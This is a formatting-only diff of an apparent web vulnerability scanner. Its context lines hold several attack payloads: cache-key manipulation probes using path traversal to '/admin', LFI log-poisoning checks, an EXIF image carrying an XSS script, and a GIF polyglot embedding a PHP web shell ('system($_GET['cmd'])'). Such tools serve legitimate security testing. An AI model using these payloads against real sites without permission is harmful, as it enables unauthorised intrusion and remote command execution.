@@ -319,12 +319,15 @@ async def phase_28_CACHED(
         try:
             cookie_val = "tracking=" + base64.b64encode(os.urandom(8)).decode()
             cookie_req = urllib.request.Request(
-                url, method="GET",
-                headers={"User-Agent": "Mozilla/5.0", "Cookie": cookie_val, **_cp_extra_headers}
+                url,
+                method="GET",
+                headers={"User-Agent": "Mozilla/5.0", "Cookie": cookie_val, **_cp_extra_headers},
             )
             _, _, cb = await _async_urlopen(cp_urlopen, cookie_req, timeout=10)
             if cb == base_body:
-                results.append(f"[cache-cookie-unkeyed] {url} — varying cookie produces same response (unkeyed cookie in cache key)")
+                results.append(
+                    f"[cache-cookie-unkeyed] {url} — varying cookie produces same response (unkeyed cookie in cache key)"
+                )
         except Exception:
             pass
         # Vary header poisoning: different X-Forwarded-Host values should produce different cached entries
@@ -333,13 +336,20 @@ async def phase_28_CACHED(
             vary_bodies = []
             for vip in vary_ips:
                 v_req = urllib.request.Request(
-                    url, method="GET",
-                    headers={"User-Agent": "Mozilla/5.0", "X-Forwarded-Host": vip, **_cp_extra_headers}
+                    url,
+                    method="GET",
+                    headers={
+                        "User-Agent": "Mozilla/5.0",
+                        "X-Forwarded-Host": vip,
+                        **_cp_extra_headers,
+                    },
                 )
                 _, _, vb = await _async_urlopen(cp_urlopen, v_req, timeout=10)
                 vary_bodies.append(vb)
             if len(set(str(b) for b in vary_bodies)) == 1:
-                results.append(f"[cache-vary-bypass] {url} — X-Forwarded-Host variations return same body (Vary header may be ignored)")
+                results.append(
+                    f"[cache-vary-bypass] {url} — X-Forwarded-Host variations return same body (Vary header may be ignored)"
+                )
         except Exception:
             pass
         # Cache key manipulation via X-Original-URL / X-Rewrite-URL with different paths
@@ -347,7 +357,8 @@ async def phase_28_CACHED(
             for man_path in ["/admin", "/../admin", "/%2e%2e/admin"]:
                 try:
                     man_req = urllib.request.Request(
-                        url, method="GET",
+                        url,
+                        method="GET",
                         headers={
                             "User-Agent": "Mozilla/5.0",
                             man_hdr: man_path,
@@ -357,7 +368,9 @@ async def phase_28_CACHED(
                     mans, manh, manb = await _async_urlopen(cp_urlopen, man_req, timeout=10)
                     man_str = str(manh).lower()
                     if "x-cache" in man_str or "age:" in man_str:
-                        results.append(f"[cache-key-manipulation] {url} via {man_hdr}: {man_path} returns cached response")
+                        results.append(
+                            f"[cache-key-manipulation] {url} via {man_hdr}: {man_path} returns cached response"
+                        )
                 except Exception:
                     continue
         return results
@@ -723,9 +736,13 @@ async def phase_30_LFI(
                             for k, vals in qs.items():
                                 for v in vals:
                                     if k == pname:
-                                        query_parts.append(f"{urllib.parse.quote_plus(k)}={encoded_payload}")
+                                        query_parts.append(
+                                            f"{urllib.parse.quote_plus(k)}={encoded_payload}"
+                                        )
                                     else:
-                                        query_parts.append(f"{urllib.parse.quote_plus(k)}={urllib.parse.quote_plus(v)}")
+                                        query_parts.append(
+                                            f"{urllib.parse.quote_plus(k)}={urllib.parse.quote_plus(v)}"
+                                        )
                             new_qs = "&".join(query_parts)
                             test_log_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                             await _throttle_rate()
@@ -733,7 +750,9 @@ async def phase_30_LFI(
                                 test_log_url,
                                 headers={"User-Agent": "Mozilla/5.0", **_lfi_extra_headers},
                             )
-                            log_status, _, log_body = await _async_urlopen(_lfi_urlopen, req, timeout=10)
+                            log_status, _, log_body = await _async_urlopen(
+                                _lfi_urlopen, req, timeout=10
+                            )
                             log_text = log_body.decode("utf-8", errors="ignore")
                             if "vulnforge_test" in log_text or "uid=" in log_text:
                                 findings.append(
@@ -1568,6 +1587,7 @@ async def phase_37_FILEUPLOAD(
     for ep in targets:
         try:
             import struct as _struct
+
             xs = b"<script>alert(1)</script>"
             exif_body = b"Exif\x00\x00"
             exif_body += b"II\x2a\x00\x08\x00\x00\x00"
@@ -1617,6 +1637,7 @@ async def phase_37_FILEUPLOAD(
     for ep in targets:
         try:
             import struct as _struct
+
             gif = b"GIF89a"
             gif += _struct.pack("<HHBBB", 1, 1, 0x00, 0, 0)
             gif += b"<?php system($_GET['cmd']); ?>"
